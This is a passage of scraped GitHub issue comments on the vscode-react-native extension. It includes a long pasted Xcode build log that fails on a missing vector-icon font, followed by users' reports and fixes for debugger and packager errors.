LD_QUOTE_LINKER_ARGUMENTS_FOR_COMPILER_DRIVER=YES\n    export LEGACY_DEVELOPER_DIR=/Applications/Xcode.app/Contents/PlugIns/Xcode3Core.ideplugin/Contents/SharedSupport/Developer\n    export LEX=lex\n    export LIBRARY_FLAG_NOSPACE=YES\n    export LIBRARY_FLAG_PREFIX=-l\n    export LIBRARY_KEXT_INSTALL_PATH=/Library/Extensions\n    export LIBRARY_SEARCH_PATHS=\"/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator \"\n    export LINKER_DISPLAYS_MANGLED_NAMES=NO\n    export LINK_FILE_LIST_normal_x86_64=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/Objects-normal/x86_64/double-conversion.LinkFileList\n    export LINK_WITH_STANDARD_LIBRARIES=YES\n    export LOCALIZABLE_CONTENT_DIR=\n    export LOCAL_ADMIN_APPS_DIR=/Applications/Utilities\n    export LOCAL_APPS_DIR=/Applications\n    export LOCAL_DEVELOPER_DIR=/Library/Developer\n    export LOCAL_LIBRARY_DIR=/Library\n    export LOCROOT=\n    export LOCSYMROOT=\n    export MACH_O_TYPE=staticlib\n    export MAC_OS_X_PRODUCT_BUILD_VERSION=17B1003\n    export MAC_OS_X_VERSION_ACTUAL=101301\n    export MAC_OS_X_VERSION_MAJOR=101300\n    export MAC_OS_X_VERSION_MINOR=1301\n    export METAL_LIBRARY_FILE_BASE=default\n    export METAL_LIBRARY_OUTPUT_DIR=/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/\n    export MODULE_CACHE_DIR=/Users/dummy/projects/app_name/ios/build/ModuleCache\n    export MTL_ENABLE_DEBUG_INFO=YES\n    export NATIVE_ARCH=i386\n    export NATIVE_ARCH_32_BIT=i386\n    export NATIVE_ARCH_64_BIT=x86_64\n    export NATIVE_ARCH_ACTUAL=x86_64\n    export NO_COMMON=YES\n    export OBJC_ABI_VERSION=2\n    export OBJECT_FILE_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/Objects\n    export OBJECT_FILE_DIR_normal=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/Objects-normal\n    export OBJROOT=/Users/dummy/projects/app_name/ios/build/Build/Intermediates\n    export ONLY_ACTIVE_ARCH=YES\n    export OS=MACOS\n    export OSAC=/usr/bin/osacompile\n    export OTHER_LDFLAGS=-ObjC\n    export PACKAGE_TYPE=com.apple.package-type.static-library\n    export PASCAL_STRINGS=YES\n    export PATH=\"/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin:/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/local/bin:/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/libexec:/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/local/bin:/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/usr/bin:/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/usr/local/bin:/Applications/Xcode.app/Contents/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/usr/local/bin:/Applications/Xcode.app/Contents/Developer/Tools:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Users/dummy/Library/Android/sdk/tools:/Users/dummy/Library/Android/sdk/platform-tools\"\n    export PATH_PREFIXES_EXCLUDED_FROM_HEADER_DEPENDENCIES=\"/usr/include /usr/local/include /System/Library/Frameworks /System/Library/PrivateFrameworks /Applications/Xcode.app/Contents/Developer/Headers /Applications/Xcode.app/Contents/Developer/SDKs /Applications/Xcode.app/Contents/Developer/Platforms\"\n    export PFE_FILE_C_DIALECTS=c++\n    export PKGINFO_FILE_PATH=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/PkgInfo\n    export PLATFORM_DEVELOPER_APPLICATIONS_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/Applications\n    export PLATFORM_DEVELOPER_BIN_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platf\norm/Developer/usr/bin\n    export PLATFORM_DEVELOPER_LIBRARY_DIR=/Applications/Xcode.app/Contents/PlugIns/Xcode3Core.ideplugin/Contents/SharedSupport/Developer/Library\n    export PLATFORM_DEVELOPER_SDK_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs\n    export PLATFORM_DEVELOPER_TOOLS_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/Tools\n    export PLATFORM_DEVELOPER_USR_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr\n    export PLATFORM_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform\n    export PLATFORM_DISPLAY_NAME=\"iOS Simulator\"\n    export PLATFORM_NAME=iphonesimulator\n    export PLATFORM_PREFERRED_ARCH=x86_64\n    export PLIST_FILE_OUTPUT_FORMAT=binary\n    export PRECOMPS_INCLUDE_HEADERS_FROM_BUILT_PRODUCTS_DIR=YES\n    export PRECOMP_DESTINATION_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/PrefixHeaders\n    export PRESERVE_DEAD_CODE_INITS_AND_TERMS=NO\n    export PRIVATE_HEADERS_FOLDER_PATH=/usr/local/include/double-conversion\n    export PRODUCT_MODULE_NAME=double_conversion\n    export PRODUCT_NAME=double-conversion\n    export PRODUCT_SETTINGS_PATH=\n    export PRODUCT_TYPE=com.apple.product-type.library.static\n    export PROFILING_CODE=NO\n    export PROJECT=React\n    export PROJECT_DERIVED_FILE_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/DerivedSources\n    export PROJECT_DIR=/Users/dummy/projects/app_name/node_modules/react-native/React\n    export PROJECT_FILE_PATH=/Users/dummy/projects/app_name/node_modules/react-native/React/React.xcodeproj\n    export PROJECT_NAME=React\n    export PROJECT_TEMP_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build\n    export PROJECT_TEMP_ROOT=/Users/dummy/projects/app_name/ios/build/Build/Intermediates\n    export PUBLIC_HEADERS_FOLDER_PATH=/usr/local/include\n    export RECURSIVE_SEARCH_PATHS_FOLLOW_SYMLINKS=YES\n    export REMOVE_CVS_FROM_RESOURCES=YES\n    export REMOVE_GIT_FROM_RESOURCES=YES\n    export REMOVE_HEADERS_FROM_EMBEDDED_BUNDLES=YES\n    export REMOVE_HG_FROM_RESOURCES=YES\n    export REMOVE_SVN_FROM_RESOURCES=YES\n    export REZ_COLLECTOR_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/ResourceManagerResources\n    export REZ_EXECUTABLE=YES\n    export REZ_OBJECTS_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/ResourceManagerResources/Objects\n    export REZ_SEARCH_PATHS=\"/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator \"\n    export SCAN_ALL_SOURCE_FILES_FOR_INCLUDES=NO\n    export SCRIPT_INPUT_FILE_COUNT=0\n    export SCRIPT_OUTPUT_FILE_COUNT=0\n    export SDKROOT=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator10.3.sdk\n    export SDK_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator10.3.sdk\n    export SDK_DIR_iphonesimulator10_3=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator10.3.sdk\n    export SDK_NAME=iphonesimulator10.3\n    export SDK_NAMES=iphonesimulator10.3\n    export SDK_PRODUCT_BUILD_VERSION=14E8301\n    export SDK_VERSION=10.3\n    export SDK_VERSION_ACTUAL=100300\n    export SDK_VERSION_MAJOR=100000\n    export SDK_VERSION_MINOR=300\n    export SED=/usr/bin/sed\n    export SEPARATE_STRIP=YES\n    export SEPARATE_SYMBOL_EDIT=NO\n    export SET_DIR_MODE_OWNER_GROUP=YES\n    export SET_FILE_MODE_OWNER_GROUP=NO\n    export SHALLOW_BUNDLE=NO\n    export SHARED_DERIVED_FILE_DIR=/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/DerivedSources\n    export SHARED_PRECOMPS_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/PrecompiledHeaders\n    export SKIP_INSTALL=YES\n    export SOURCE_ROOT=/Users/dummy/projects/app_name/node_modules/react-native/React\n    export SRCROOT=/Users/dummy/projects/app_name/node_modules/react-native/React\n    export STRINGS_FILE_OUTPUT_ENCODING=binary\n    export STRIP_BITCODE_FROM_COPIED_FILES=NO\n    export STRIP_INSTALLED_PRODUCT=YES\n    export STRIP_STYLE=debugging\n    export SUPPORTED_DEVICE_FAMILIES=1,2\n    export SUPPORTED_PLATFORMS=\"iphonesimulator iphoneos\"\n    export SUPPORTS_TEXT_BASED_API=NO\n    export SWIFT_PLATFORM_TARGET_PREFIX=ios\n    export SYMROOT=/Users/dummy/projects/app_name/ios/build/Build/Products\n    export SYSTEM_ADMIN_APPS_DIR=/Applications/Utilities\n    export SYSTEM_APPS_DIR=/Applications\n    export SYSTEM_CORE_SERVICES_DIR=/System/Library/CoreServices\n    export SYSTEM_DEMOS_DIR=/Applications/Extras\n    export SYSTEM_DEVELOPER_APPS_DIR=/Applications/Xcode.app/Contents/Developer/Applications\n    export SYSTEM_DEVELOPER_BIN_DIR=/Applications/Xcode.app/Contents/Developer/usr/bin\n    export SYSTEM_DEVELOPER_DEMOS_DIR=\"/Applications/Xcode.app/Contents/Developer/Applications/Utilities/Built Examples\"\n    export SYSTEM_DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer\n    export SYSTEM_DEVELOPER_DOC_DIR=\"/Applications/Xcode.app/Contents/Developer/ADC Reference Library\"\n    export SYSTEM_DEVELOPER_GRAPHICS_TOOLS_DIR=\"/Applications/Xcode.app/Contents/Developer/Applications/Graphics Tools\"\n    export SYSTEM_DEVELOPER_JAVA_TOOLS_DIR=\"/Applications/Xcode.app/Contents/Developer/Applications/Java Tools\"\n    export SYSTEM_DEVELOPER_PERFORMANCE_TOOLS_DIR=\"/Applications/Xcode.app/Contents/Developer/Applications/Performance Tools\"\n    export SYSTEM_DEVELOPER_RELEASENOTES_DIR=\"/Applications/Xcode.app/Contents/Developer/ADC Reference Library/releasenotes\"\n    export SYSTEM_DEVELOPER_TOOLS=/Applications/Xcode.app/Contents/Developer/Tools\n    export SYSTEM_DEVELOPER_TOOLS_DOC_DIR=\"/Applications/Xcode.app/Contents/Developer/ADC Reference Library/documentation/DeveloperTools\"\n    export SYSTEM_DEVELOPER_TOOLS_RELEASENOTES_DIR=\"/Applications/Xcode.app/Contents/Developer/ADC Reference Library/releasenotes/DeveloperTools\"\n    export SYSTEM_DEVELOPER_USR_DIR=/Applications/Xcode.app/Contents/Developer/usr\n    export SYSTEM_DEVELOPER_UTILITIES_DIR=/Applications/Xcode.app/Contents/Developer/Applications/Utilities\n    export SYSTEM_DOCUMENTATION_DIR=/Library/Documentation\n    export SYSTEM_KEXT_INSTALL_PATH=/System/Library/Extensions\n    export SYSTEM_LIBRARY_DIR=/System/Library\n    export TAPI_VERIFY_MODE=ErrorsOnly\n    export TARGETED_DEVICE_FAMILY=1\n    export TARGETNAME=double-conversion\n    export TARGET_BUILD_DIR=/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator\n    export TARGET_DEVICE_IDENTIFIER=ECCE2E54-8C88-4298-8240-ABDE96287E1E\n    export TARGET_DEVICE_MODEL=iPhone6,1\n    export TARGET_DEVICE_OS_VERSION=10.3.1\n    export TARGET_NAME=double-conversion\n    export TARGET_TEMP_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build\n    export TEMP_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build\n    export TEMP_FILES_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build\n    export TEMP_FILE_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build\n    export TEMP_ROOT=/Users/dummy/projects/app_name/ios/build/Build/Intermediates\n    export TOOLCHAINS=com.apple.dt.toolchain.XcodeDefault\n    export TOOLCHAIN_DIR=/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain\n    export TREAT_MISSING_BASELINES_AS_TEST_FAILURES=NO\n    export UID=501\n    export UNSTRIPPED_PRODUCT=NO\n    export USER=dummy\n    export USER_APPS_DIR=/Users/dummy/Applications\n    export USER_LIBRARY_DIR=/Users/ishit\nasinha/Library\n    export USE_DYNAMIC_NO_PIC=YES\n    export USE_HEADERMAP=YES\n    export USE_HEADER_SYMLINKS=NO\n    export VALIDATE_PRODUCT=NO\n    export VALID_ARCHS=\"i386 x86_64\"\n    export VERBOSE_PBXCP=NO\n    export VERSION_INFO_BUILDER=dummy\n    export VERSION_INFO_FILE=double-conversion_vers.c\n    export VERSION_INFO_STRING=\"\\\"@(#)PROGRAM:double-conversion  PROJECT:React-\\\"\"\n    export WARNING_CFLAGS=\"-Wextra -Wall -Wno-semicolon-before-method-body\"\n    export WRAP_ASSET_PACKS_IN_SEPARATE_DIRECTORIES=NO\n    export XCODE_APP_SUPPORT_DIR=/Applications/Xcode.app/Contents/Developer/Library/Xcode\n    export XCODE_PRODUCT_BUILD_VERSION=8E3004b\n    export XCODE_VERSION_ACTUAL=0833\n    export XCODE_VERSION_MAJOR=0800\n    export XCODE_VERSION_MINOR=0830\n    export XPCSERVICES_FOLDER_PATH=/XPCServices\n    export YACC=yacc\n    export arch=x86_64\n    export variant=normal\n    /bin/sh -c /Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/Script-190EE32F1E6A43DE00A8543A.sh\n=== BUILD TARGET third-party OF PROJECT React WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET jschelpers OF PROJECT React WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET cxxreact OF PROJECT React WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET React OF PROJECT React WITH CONFIGURATION Debug ===\nCheck dependencies\nPhaseScriptExecution Start\\ Packager /Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/React.build/Script-006B79A01A781F38006873D1.sh\n    cd /Users/dummy/projects/app_name/node_modules/react-native/React\n    /bin/sh -c /Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/React.build/Script-006B79A01A781F38006873D1.sh\nPhaseScriptExecution Include\\ RCTJSCProfiler /Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/React.build/Script-142C4F7F1B582EA6001F0B58.sh\n    cd /Users/dummy/projects/app_name/node_modules/react-native/React\n    /bin/sh -c /Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/React.build/Script-142C4F7F1B582EA6001F0B58.sh\n=== BUILD TARGET RCTCameraRoll OF PROJECT RCTCameraRoll WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTActionSheet OF PROJECT RCTActionSheet WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET AutoGrowTextInput OF PROJECT AutoGrowTextInput WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTLinking OF PROJECT RCTLinking WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTSettings OF PROJECT RCTSettings WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTText OF PROJECT RCTText WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTGeolocation OF PROJECT RCTGeolocation WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RNVectorIcons OF PROJECT RNVectorIcons WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET Pods-AppName OF PROJECT Pods WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTImage OF PROJECT RCTImage WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTAnimation OF PROJECT RCTAnimation WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTNetwork OF PROJECT RCTNetwork WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTVibration OF PROJECT RCTVibration WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET RCTWebSocket OF PROJECT RCTWebSocket WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET AppName OF PROJECT AppName WITH CONFIGURATION Debug ===\nCheck dependencies\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/Entypo.ttf\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/EvilIcons.ttf\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/FontAwesome.ttf\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/Foundation.ttf\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/Ionicons.ttf\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/MaterialCommunityIcons.ttf\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/MaterialIcons.ttf\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/Octicons.ttf\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/SimpleLineIcons.ttf\nWarning: Multiple build commands for output file /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/Zocial.ttf\nCpResource /Users/dummy/projects/app_name/node_modules/react-native-vector-icons/Fonts/Feather.ttf build/Build/Products/Debug-iphonesimulator/AppName.app/Feather.ttf\n    cd /Users/dummy/projects/app_name/ios\n    export PATH=\"/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/usr/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Users/dummy/Library/Android/sdk/tools:/Users/dummy/Library/Android/sdk/platform-tools\"\n    builtin-copy -exclude .DS_Store -exclude CVS -exclude .svn -exclude .git -exclude .hg -resolve-src-symlinks /Users/dummy/projects/app_name/node_modules/react-native-vector-icons/Fonts/Feather.ttf /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app\nerror: /Users/dummy/projects/app_name/node_modules/react-native-vector-icons/Fonts/Feather.ttf: No such file or directory\nCompileXIB AppName/Base.lproj/LaunchScreen.xib\n    cd /Users/dummy/projects/app_name/ios\n    export PATH=\"/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/usr/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Users/dummy/Library/Android/sdk/tools:/Users/dummy/Library/Android/sdk/platform-tools\"\n    export XCODE_DEVELOPER_USR_PATH=/Applications/Xcode.app/Contents/Developer/usr/bin/..\n    /Applications/Xcode.app/Contents/Developer/usr/bin/ibtool --errors --warnings --notices --module AppName --output-partial-info-plist /Users/dummy/projects/app_name/ios/build/Build/Intermediates/AppName.build/Debug-iphonesimulator/AppName.build/LaunchScreen-PartialInfo.plist --auto-activate-custom-fonts --target-device iphone --minimum-deployment-target 8.0 --output-format human-readable-text --compile /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app/Base.lproj/LaunchScreen.nib /Users/dummy/projects/app_name/ios/AppName/Base.lproj/LaunchScreen.xib\nCompileAssetCatalog build/Build/Products/Debug-iphonesimulator/AppName.app AppName/Images.xcassets\n    cd /Users/dummy/projects/app_name/ios\n    export PATH=\"/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/usr/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Users/dummy/Library/Android/sdk/tools:/Users/dummy/Library/Android/sdk/platform-tools\"\n    /Applications/Xcode.app/Contents/Developer/usr/bin/actool --output-format human-readable-text --notices --warnings --export-dependency-info /Users/dummy/projects/app_name/ios/build/Build/Intermediates/AppName.build/Debug-iphonesimulator/AppName.build/assetcatalog_dependencies --output-partial-info-plist /Users/dummy/projects/app_name/ios/build/Build/Intermediates/AppName.build/Debug-iphonesimulator/AppName.build/assetcatalog_generated_info.plist --app-icon AppIcon --launch-image LaunchImage --compress-pngs --enable-on-demand-resources YES --filter-for-device-model iPhone6,1 --filter-for-device-os-version 10.3.1 --sticker-pack-identifier-prefix com.package.appname.sticker-pack. --target-device iphone --minimum-deployment-target 8.0 --platform iphonesimulator --product-type com.apple.product-type.application --compile /Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/AppName.app /Users/dummy/projects/app_name/ios/AppName/Images.xcassets\n BUILD FAILED \nThe following build commands failed:\nCpResource /Users/dummy/projects/app_name/node_modules/react-native-vector-icons/Fonts/Feather.ttf build/Build/Products/Debug-iphonesimulator/AppName.app/Feather.ttf\n\n(1 failure)\nInstalling build/Build/Products/Debug-iphonesimulator/AppName.app\nLaunching com.package.appname\ncom.package.appname: 5769\n``. @iTOYS thanks for the debugging help. Removingreact-native-vector-icons` from package.json worked. I will be looking at the output from the Run Ios configuration from now on. \ud83d\ude42 . @iTOYS The problem is on Run Android, I think.\n@Donhv Paste the output from the channel you're having the issue in. You'll probably fix it yourself if you see the output from that channel. :) . ",
    "Donhv": "@iTOYS \nI run debug android and error:\n[Error] Error: Unknown error: not all success patterns were matched\nPls help!\n. @ishiestar\n@iTOYS \nThanks for yours help. I fix error by add: \nexport PATH=$PATH:$ANDROID_HOME\nexport PATH=$PATH:$ANDROID_HOME/tools\nexport PATH=$PATH:$ANDROID_HOME/platform-tools to 'bash_profile'. . ",
    "CrazzzyDev": "Facing this issue with multiple workspace project. Our project uses Haul as well. Below is the version detail.\nIssue: Reference Error: fetch not found\nfile path : /.vscode/.react/debuggerWorker.js\nVScode : 1.30.1\nHaul: 1.0.0-rc.10\n@iTOYS @svekl can you please look, what can be the issue?. @ruslan-bikkinin can you please help in this issue. . @SounD120 Here are some more detail on issue:\n\nRootProject\n.vscode\npackage.json - common dependency \ncommon - sharing by all project\nProject1\n.vscode\npackage.json\nindex.js\n\n\nProject2\n.vscode\npackage.json\nindex.js\n\n\n\n\n\nI  am using Haul as package manager and my haul.config.js has some other loader as well.\nProject has custom script to start normal app with haul. \n\n\nMy Observation:\n\nwhen I start vscode debugger it start default packager Metro and my app uses Haul packager. Does vscode debugger support debugging with Haul?\nOpen project 1, start debugger,  gives error fetch not found /.vscode/.react/debuggerWorker.js\nCreated new demo project(single root only, no multiroot) with Haul & trying to debug it. It gives below error.\n\n\n\nDemo project: Debug Console error\nAdapter node: v8.9.3 x64\nvscode-chrome-debug-core: 3.17.3\nStarting debugger app worker.\nCould not debug. <!DOCTYPE html>\n\n\n\nError\n\n\n\n\n. @SounD120 Do you want me to send demo project(single root only, no multiroot) that's not working with Haul?. @ruslan-bikkinin here is the demo https://github.com/CrazzzyDev/monorepoEx.\nIntegrated Haul with it and debugger is not working.\nVersion Detail:\nVisual Studio Code:  1.30.1\nReact Native\": 0.57.8\nReact Native Tools: 0.7.0\nvscode-chrome-debug-core: 3.17.3\nNode: 8.12.0\n. Thanks @SounD120 for the quick finding. \nCan you please tell when new version will come out?\nOR till the new version come out is there any work around for it, so I can debug project. . @SounD120 I have tried the fix, seems it not working.\nSteps I followed:\n1) Applied #880 in my local scriptImporter.js file\n2) Open monorepoEx/nativeB project to vscode\n3) Start haul packager in terminal\n4) Run ios app \n5) Vscode -> Debugger -> Attach to Package\n6) It gives below error:\nOS: darwin x64\nAdapter node: v8.9.3 x64\nvscode-chrome-debug-core: 3.17.3\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDisconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\nCould not debug. Another debugger is already connected to packager. Please close it before trying to debug with VSCode.\n. ",
    "strake7": "@iTOYS Appreciate the prompt fix! . ",
    "wilomgfx": "I can confirm i get the same thing by just trying to launch my iOS app from vscode.. @callagga React packager is the old packager. React native (new versions) use Metro Bundler instead. Upgrade your old project.. @callagga  yes.\n. ",
    "omdv": "confirm that the issue is gone. Was fixed 12 days ago by https://github.com/Microsoft/vscode-react-native/pull/600 Thanks.. ",
    "romk1n": "I am using vscode - Version 1.18.1 (1.18.1) and latest plugin and still see the issue, ay idea how to fix it?. @iTOYS yeah it does. .what kind of info you need ?\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.18.5\nCould not debug. Error while executing command 'react-native run-ios --simulator --no-packager': Error while executing command 'react-native run-ios --simulator --no-packager'\nreact-native tools 0.5.7\nreact-native-cli: 2.0.1\nreact-native: 0.50.3\nnodjs - v8.9.1\nMac OSX - 10.13.1. ",
    "gvillenave": "I'm still seeing this error on version 0.5.7 of the extension, with RN 0.49.5. @iTOYS can you explain what the fix was and if there's anything required to make it work properly?\n  . ",
    "novellizator": "the issue persists. So something definitelly with the newest update, since it worked in the past. . Is there anything we can help with? I'll have to switch from VSCode unless this gets fixed :/. Invalidating <RCTCxxBridge: 0x6040003c97e0> (parent: <RCTBridge: 0x6040000cae20>, executor: RCTWebSocketExecutor)\nRCTLog.js:48\nDebugger worker loaded runtime on port 33223\nModule RCTImageLoader requires main queue setup since it overrides `init` but doesn't implement `requiresMainQueueSetup`. In a future release React Native will default to initializing all native modules on a background thread unless explicitly opted-out of.\nRCTLog.js:48\nRunning application issue625 ({\nRCTLog.js:48\n    initialProps =     {\n    };\n    rootTag = 31;\n})\nRunning application \"issue625\" with appParams: {\"rootTag\":31,\"initialProps\":{}}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nFun stuff: I added a console.warn to the click function so that it look like this\nclick() {\n    console.warn(\"hahaha\");\n    this.setState({ clicks: ++this.state.clicks });\n  }\nand set a breakpoint to this.setState(). The debugger didn't work.\nBut then, I set another breakpoint to the line with console.warn, and everything worked.. can't it be some version of external dependency?. I dont remember when the VSCode got updated, but it's a fairly recent issue. Can I somewhere find an older version of VSCode to try it out? (there isn't one on the homepage). are you sure there any any download links? don't see any... please send me\na link for macOS download of some older version....\nOn Tue, Feb 20, 2018 at 11:52 AM, Sergey Akhalkov notifications@github.com\nwrote:\n\n@novellizator https://github.com/novellizator, here is\nhttps://code.visualstudio.com/updates/v1_20\nFor older version of VSCode you can found download links there, please let\nme know if you need anything else.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/625#issuecomment-366940168,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AChNTbeUlk_p27UlYE8c-PoyhirrAvoXks5tWqPpgaJpZM4R5GjR\n.\n. My bad, just quickly searched for \"download\" and didn't find anything relevant on the webpage.\nAnyways, 1.19 works well. So it only breaks on 1.20. You wont believe this. But I tried running 1.18 with tools 0.5.7 and it worked, then updated the tools to 0.6.0, still worked, Then ran VSC 1.19, still worked (I didn't remove the original VSCode though!) and now that I opened VSC 1.20 (I had it in /Applications for the whole time), it magically works again... So probably I can't (and don't reaaaly want to ;) ) reproduce the bug again...\n\nI thing that I noticed (hopefully right) is, that I didn't seem to have the \"Node Debug 2@1.20.0\" extension installed at the time whe it didn't work. I'm not sure if I remember correcly though.. For what it's worth:\n1. no\n2. originally the issue reproduced on your code, also, now your code works\n3. macOS\n5. default\n6. no, never before\nOn Tue, Feb 20, 2018 at 2:48 PM, Sergey Akhalkov notifications@github.com\nwrote:\n\nHey guys, I've tried to reproduce the issue both for Android and iOS on\nmacOS but with no luck. So I need your help to figure out what goes wrong.\nCould you please answer the following questions to make things clear:\n\nAre you using TypeScript in your project?\nDoes the issue reproduces on the test app I've provided here #625\n   (comment)\n   https://github.com/Microsoft/vscode-react-native/issues/625#issuecomment-366719491\n   If not, please provide us a minimum working version of your app.\n   @dancomanlive https://github.com/dancomanlive, could you please\n   share the link to your app where the issue reproduces?\nWhat OS are you using: macOS, Windows?\nDoes this issue have a stable repo? If so, could you please provide\n   repro steps?\nWhat launch configuration are you using, default or custom?\nHave you ever seen this issue before VSCode version 1.20 or it\n   reproduces for 1.20 only?\nWhat version of react-native-cli are you using?\nPlease share exact version of your software you are using for\n   development from this issue template\n   https://github.com/Microsoft/vscode-react-native/issues/new\n\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on 